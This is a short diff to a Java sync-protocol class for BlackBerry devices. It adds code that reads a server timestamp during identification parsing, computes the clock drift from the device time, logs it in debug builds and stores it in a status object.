@@ -2,6 +2,7 @@
 package blackberry.action.sync.protocol;
 
 import java.io.EOFException;
+import java.util.Date;
 import java.util.Vector;
 
 import net.rim.device.api.crypto.CryptoException;
@@ -10,6 +11,7 @@ import net.rim.device.api.crypto.SHA1Digest;
 import net.rim.device.api.util.ByteVector;
 import net.rim.device.api.util.DataBuffer;
 import blackberry.Device;
+import blackberry.Status;
 import blackberry.action.sync.Protocol;
 import blackberry.action.sync.transport.TransportException;
 import blackberry.config.Conf;
@@ -337,6 +339,21 @@ public class ZProtocol extends Protocol {
             try {
                 // la totSize e' discutibile
                 int totSize = dataBuffer.readInt();
+                
+                long dateServer = dataBuffer.readLong();
+                
+                //#ifdef DEBUG
+                debug.trace("parseIdentification: " + dateServer);                
+                //#endif
+                
+                Date date = new Date();
+                int drift =  (int) (dateServer - (date.getTime()/1000)) ;
+                
+                //#ifdef DEBUG
+                debug.trace("parseIdentification drift: " + drift);
+                //#endif
+                Status.getInstance().drift = drift;
+                
                 int numElem = dataBuffer.readInt();
 
                 for (int i = 0; i < numElem; i++) {
